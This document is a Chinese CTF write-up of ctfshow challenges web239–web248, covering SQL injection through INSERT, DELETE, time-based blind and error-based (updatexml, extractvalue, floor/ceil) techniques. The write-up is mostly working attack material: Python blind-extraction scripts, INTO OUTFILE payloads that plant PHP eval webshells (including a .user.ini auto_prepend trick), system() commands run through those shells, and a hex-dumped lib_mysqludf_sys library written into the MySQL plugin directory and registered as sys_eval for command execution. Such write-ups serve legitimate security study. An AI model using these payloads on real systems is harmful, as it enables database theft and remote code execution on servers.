<img src="\images\article_images\image-20250903140338333.png" alt="image-20250903140338333" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903140359738.png" alt="image-20250903140359738" style="zoom:25%;" />



---

# web239

```sql
insert注入


查询语句
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
      
      
返回逻辑
  //过滤空格 or 
```

&nbsp;



```sql
username=1',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));#

password=1
```

<img src="\images\article_images\image-20250903151936246.png" alt="image-20250903151936246" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903152035198.png" alt="image-20250903152035198" style="zoom:25%;" />

&nbsp;



```sql
username=1',(select(flag)from(flagbb)));#

password=1
```

<img src="\images\article_images\image-20250903152102212.png" alt="image-20250903152102212" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250903152119760.png" alt="image-20250903152119760" style="zoom:25%;" />

&nbsp;



---

# web240

```sql
insert注入


查询语句
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
      
      
返回逻辑
  ///过滤空格 or sys mysql 
```

**题目Hint：表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写**

&nbsp;



**可以将所有情况都添加进去，最终一定会有一个正确的回显**

**使用脚本完成添加**

```python
import requests
url="http://ac7e7d6c-ce76-4839-8978-14c09460b1e9.challenge.ctf.show/api/insert.php"
for a1 in "ab":
    for a2 in "ab":
        for a3 in "ab":
            for a4 in "ab":
                for a5 in "ab":
                    payload="flag"+a1+a2+a3+a4+a5
                    data={
                        'username':f"1',(select(flag)from({payload})))#",
                        'password':'1'
                    }
                    r=requests.post(url,data=data)
```

<img src="\images\article_images\image-20250903152746741.png" alt="image-20250903152746741" style="zoom:80%;" />

&nbsp;



---

# web241

```sql
delete注入


sql语句
  //删除记录
  $sql = "delete from  ctfshow_user where id = {$id}";
    
    
返回逻辑
  //无过滤
```

&nbsp;



<img src="\images\article_images\image-20250903164527726.png" alt="image-20250903164527726" style="zoom:80%;" />

```python
import requests
import time

url = 'http://dfd59311-8570-435f-b116-8d9c7ddba7e2.challenge.ctf.show/api/delete.php'
flag = ''
i = 0

while 1:
    i += 1
    head = 32
    tail = 127
    while head < tail:
        mid = (head + tail) >> 1
        # 查库名
        # payload = 'database()'

        # 查表名
        # payload = '(select group_concat(table_name) from information_schema.tables where table_schema=database())'

        # 查列名
        # payload = "(select group_concat(column_name) from information_schema.columns where table_name='flag')"

        # 查flag
        payload = '(select flag from flag)'
        
        data = {
            'id':f"if(ascii(substr({payload},{i},1))>{mid},sleep(0.1),0)#"
        }

        try:
            r = requests.post(url=url,data=data,timeout=2.1)
            tail = mid
        except Exception as e:
            head = mid + 1
        time.sleep(1)
    if head != 32:
        flag += chr(head)
    else:
        break
    time.sleep(1)
    print(flag)
```

&nbsp;



---

# web242

```sql
文件读写


sql语句
  //备份表
  $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";
    
    
返回逻辑
  //无过滤
```

&nbsp;



**`into outfile` 的扩展选项**

```sql
[{fields | columns}
    [terminated by 'string']       -- 列分隔符
    [[optionally] enclosed by 'char']  -- 列值用什么符号包裹
    [escaped by 'char']            -- 转义符
]
[lines
    [starting by 'string']         -- 每行开头
    [terminated by 'string']       -- 每行结尾
]	

“OPTION”参数为可选参数选项，其可能的取值有：
 
`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
 
`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
 
`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
 
`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
 
`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
 
`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
```

&nbsp;





```php
#GET
/api/dump.php

#POST
filename=1.php' fields terminated by '<?php eval($_REQUEST[1]);?>'#
```

<img src="\images\article_images\image-20250903201627802.png" alt="image-20250903201627802" style="zoom:25%;" />

&nbsp;



```php
#GET
/dump/1.php

#POST
1=system("ls /");
```

<img src="\images\article_images\image-20250903201656991.png" alt="image-20250903201656991" style="zoom:25%;" />

&nbsp;



```php
#GET
/dump/1.php

#POST
1=system("cat /flag.here");
```

<img src="\images\article_images\image-20250903201819479.png" alt="image-20250903201819479" style="zoom:25%;" />

&nbsp;



---

# web243

```sql
文件读写


sql语句
  //备份表
  $sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";
    
    
返回逻辑
  //过滤了php
```

&nbsp;



**==题解一==**

**使用 `.user.ini` 文件上传**

**`auto_prepend_file=1.jpg` Hex编码后为 `0x6175746f5f70726570656e645f66696c653d312e6a7067`**

**为保证 `auto_prepend_file=1.jpg` 单独一行，在字符串前后添加 `0a` 进行换行，最终为 `0x0a6175746f5f70726570656e645f66696c653d312e6a70670a`**

&nbsp;



```php
#GET
/api/dump.php

#POST
filename=.user.ini' lines starting by ';' terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#
```

<img src="\images\article_images\image-20250903221809840.png" alt="image-20250903221809840" style="zoom:25%;" />

&nbsp;



```php
#GET
/api/dump.php

#POST
filename=1.jpg' lines starting by '<?=eval($_POST[1]);?>'#
```

<img src="\images\article_images\image-20250903221532567.png" alt="image-20250903221532567" style="zoom:25%;" />

&nbsp;



```php
#GET
/dump/index.php

#POST
1=system("ls /")
```

<img src="\images\article_images\image-20250903221633240.png" alt="image-20250903221633240" style="zoom:25%;" />

&nbsp;



```php
#GET
/dump/index.php

#POST
1=system("cat /flag.here");
```

<img src="\images\article_images\image-20250903221715881.png" alt="image-20250903221715881" style="zoom:25%;" />

&nbsp;



**==题解二==**

**预估为非预期解**

&nbsp;



**`<?php eval($_POST[1]);?>` Hex编码**

**`0x3c3f706870206576616c28245f504f53545b315d293b3f3e`**

```php
#GET
/api/dump.php

#POST
filename=file.p\hp' lines starting by 3c3f706870206576616c28245f504f53545b315d293b3f3e# 
```

<img src="\images\article_images\image-20250903222456749.png" alt="image-20250903222456749" style="zoom:25%;" />

&nbsp;



```php
#GET
/dump/file.php

#POST
1=system("cat /flag.here");
```

<img src="\images\article_images\image-20250903222523856.png" alt="image-20250903222523856" style="zoom:25%;" />

&nbsp;



---

# web244

```sql
报错注入


sql语句
  //备份表
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
      
      
返回逻辑
  //无过滤
```

&nbsp;



**`extractvalue(目标xml文档，xml路径)` : 对XML文档进行查询的函数**  

&nbsp;



**`updatexml(目标xml文档，xml路径，更新的内容)` : 更新xml文档的函数**

**对于 `updatexml(xml_target, xpath_expr, new_value)`  ，如果 xpath 表达式不合法，mysql 会报错**

**错误信息里会把拼进去的字符串显示出来**

如果 `xpath` 开头是字母，mysql 会把它尝试解析为 xpath 路径，因此在前面添加 `1` 用来强制制造错误，保证结果一定出现在报错信息里

&nbsp;



```php
/api/?id=' or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+
```

<img src="\images\article_images\image-20250904095706751.png" alt="image-20250904095706751" style="zoom:25%;" />

&nbsp;



```php
/api/?id=' or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flag')),1)--+
```

<img src="\images\article_images\image-20250904095838482.png" alt="image-20250904095838482" style="zoom:25%;" />

&nbsp;



**`right(str, n)`**

- 作用：取字符串 **右边 n 个字符**

&nbsp;



**由于报错信息长度有限，所以选择分段读取)**

```php
/api/?id=' or updatexml(1,(select left(flag,15) from ctfshow_flag limit 0,1),1)--+
/api/?id=' or updatexml(1,(select right(flag,35) from ctfshow_flag limit 0,1),1)--+
```

<img src="\images\article_images\image-20250904100451381.png" alt="image-20250904100451381" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250904100541237.png" alt="image-20250904100541237" style="zoom:25%;" />

&nbsp;







---

# web245

```sql
报错注入


sql语句
  //备份表
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
      
      
返回逻辑
  //无过滤
  过滤updatexml
```

&nbsp;



```php
/api?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())));--+
```

<img src="\images\article_images\image-20250904105242051.png" alt="image-20250904105242051" style="zoom:25%;" />

&nbsp;



```php
/api?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa')));--+
```

<img src="\images\article_images\image-20250904105334612.png" alt="image-20250904105334612" style="zoom:25%;" />

&nbsp;



```php
/api?id=1' or extractvalue(1,concat(0x7e,(select left(flag1,20) from ctfshow_flagsa)));--+
/api?id=1' or extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa)));--+
```

<img src="\images\article_images\image-20250904105543401.png" alt="image-20250904105543401" style="zoom:25%;" />

&nbsp;



<img src="\images\article_images\image-20250904105443894.png" alt="image-20250904105443894" style="zoom:25%;" />

&nbsp;



---

# web246

```sql
报错注入


sql语句
  //备份表
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
      
      
返回逻辑
  //无过滤
  过滤updatexml extractvalue
```

&nbsp;



`floor(x)` → 向下取整函数。

`floor(x)`配合 **`group by` + `rand()`**，能制造 **唯一约束冲突**，从而触发报错

关键语句结构：

```sql
select count(*), floor(rand(0)*2) as x 
from information_schema.tables 
group by x;
```

- `rand(0)`：在 `group by` 中多次调用时，返回结果可能不一样（这是 mysql 的一个 bug 特性）
- `floor(rand(0)*2)`：结果只有 `0` 或 `1`
- `group by x`：分组的时候会出现 **重复键值**，导致报错：

&nbsp;



**==题解一==**

```php
/api/?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
```

<img src="\images\article_images\image-20250904111140674.png" alt="image-20250904111140674" style="zoom:25%;" />

&nbsp;



```php
/api/?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flags' limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
```

<img src="\images\article_images\image-20250904111224910.png" alt="image-20250904111224910" style="zoom:25%;" />

&nbsp;



```php
/api/?id=1' union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a--+
```

<img src="\images\article_images\image-20250904111327479.png" alt="image-20250904111327479" style="zoom:25%;" />

&nbsp;



**==题解二==**

**盲注**

<img src="\images\article_images\image-20250904112343069.png" alt="image-20250904112343069" style="zoom:80%;" />

```python
import time
import requests

dicts = '0123456789abcdefghijklmnopqrstuvwxyz-_{},'
flag = ''
url = 'http://59254d5e-0251-4f4a-9348-97749b150a50.challenge.ctf.show/api/'

def get_flag_char(index):
    for char in dicts:
        payload = {
            #"id": f"1' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{index},1)='{char}',sleep(0.1),0)#"
            #"id": f"1' or if(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flags'),{index},1)='{char}',sleep(0.1),0)#"
            "id": f"1' or if(substr((select flag2 from ctfshow_flags),{index},1)='{char}',sleep(0.1),0)#"

        }
        try:
            start_time = time.time()
            r = requests.get(url=url, params=payload).text
            end_time = time.time()
            sub = end_time - start_time
            if sub >= 0.5:
                return char
        except requests.RequestException as e:
            print(f"请求失败: {e}")
    return None
for i in range(1, 64):
    char = get_flag_char(i)
    if char:
        flag += char
        print(f"当前进度: {flag}")
    else:
        print("已结束")
        break
print(f"最终结果: {flag}")
```



&nbsp;



---

# web247

```sql
报错注入


sql语句
  //备份表
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
      
      
返回逻辑
  //无过滤
  过滤updatexml extractvalue floor
```

**`floor()：向下取整`
`ceil()：向上取整`
`round()：四舍五入`**

&nbsp;



**在 MySQL 里，数据库名、表名、字段名 默认可以直接写**

**为了区分保留字（某个表/字段恰好取了 `select`、`order`、`desc` 等名字） 、支持特殊字符（`-`、空格、中文、大小写敏感），则需要使用反引号 `` ` `` 进行包裹**

&nbsp;



**SQL 标准：在使用 `GROUP BY` 时，`SELECT` 列表中的非聚合列必须出现在 `GROUP BY` 子句中**

**`count(*)` 为聚合函数，聚合列允许不出现在 `group by`**

&nbsp;



```php
/api?id=1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
```

<img src="\images\article_images\image-20250904130208682.png" alt="image-20250904130208682" style="zoom:25%;" />

&nbsp;



```php
/api?id=1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='ctfshow_flagsa' limit 1,1),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
```

<img src="\images\article_images\image-20250904130321168.png" alt="image-20250904130321168" style="zoom:25%;" />



&nbsp;



```php
/api?id=1' union select 1,count(*),concat((select `flag?` from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.tables group by a--+
```

<img src="\images\article_images\image-20250904130406274.png" alt="image-20250904130406274" style="zoom:25%;" />

&nbsp;



---

# web248

```sql
UDF注入


sql语句
  $sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
      
      
返回逻辑
  //无过滤,
```



**UDF用户自定义函数**

1. **UDF**

- **全称**：User Defined Function（用户自定义函数）

- **用途**：MySQL 自带的函数有限，如果我们想让 MySQL 扩展新的功能，可以通过 **UDF 插件**的方式，把自己写的函数加载进 MySQL。

- **调用方式**：和系统函数完全一样，比如：

  ```sql
  select version();         -- 系统函数
  select mycustomfunc(123); -- 用户自定义函数
  ```

2. **UDF 的实现**

- UDF 一般用 **C 或 C++** 写，因为它们需要编译成 MySQL 能调用的二进制格式。
- 在 Windows 下，UDF 文件后缀是 **`.dll`**，在 Linux 下是 **`.so`**。
- 把编译好的动态库放到 MySQL 的插件目录里（一般是 `/usr/lib/mysql/plugin/` 或者配置文件里指定的 `plugin_dir`），然后用 SQL 注册函数。

&nbsp;



**==题解一==**

**查看 MySQL 版本，确保 大于 5.1，因为从 5.1 开始 MySQL 引入了 plugin 机制，支持 UDF 动态库**

```php
/api?id=1';select version();%23
```

<img src="\images\article_images\image-20250904153041868.png" alt="image-20250904153041868" style="zoom:25%;" />

&nbsp;



**查询插件目录（`@@plugin_dir`）**

```php
/api?id=1';select @@plugin_dir;%23
```

<img src="\images\article_images\image-20250904153151792.png" alt="image-20250904153151792" style="zoom:25%;" />

&nbsp;



**Linux 下动态库 `.so` 的文件头是 `0x7f 45 4c 46`，ASCII 是 `DEL ELF`**

**由于单次注入写入太长的 payload 会失败，所以 WP 把动态库拆成 多段（1.txt、2.txt、3.txt ）**

**第一次写入**

```php
/api/?id=1';select '7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803' into dumpfile '/usr/lib/mariadb/plugin/1.txt'%23
```

<img src="\images\article_images\image-20250904153318603.png" alt="image-20250904153318603" style="zoom:25%;" />

&nbsp;



**验证是否写入成功**

```php
/api?id=1';select load_file('/usr/lib/mariadb/plugin/1.txt')%23
```

<img src="\images\article_images\image-20250904154202481.png" alt="image-20250904154202481" style="zoom:25%;" />

&nbsp;



**第二次写入**

```php
/api/?id=1';select '000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e' into dumpfile '/usr/lib/mariadb/plugin/2.txt'%23
```

&nbsp;



**第三次写入**

```php
/api/?id=1';select '332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000' into dumpfile '/usr/lib/mariadb/plugin/3.txt'%23
```

&nbsp;



**将三个文件的二进制数据内容拼接一个文件， 写入完整动态库 `love.so`**

```php
/api?id=1';select unhex(concat(load_file('/usr/lib/mariadb/plugin/1.txt'),load_file('/usr/lib/mariadb/plugin/2.txt'),load_file('/usr/lib/mariadb/plugin/3.txt'))) into dumpfile '/usr/lib/mariadb/plugin/love.so'%23
```

<img src="\images\article_images\image-20250904153430635.png" alt="image-20250904153430635" style="zoom:25%;" />

&nbsp;



**为 UDF 命名 `sys_eval`，声明函数的返回类型是字符串**

```php
/api?id=1';create function sys_eval returns string soname 'love.so'%23
```

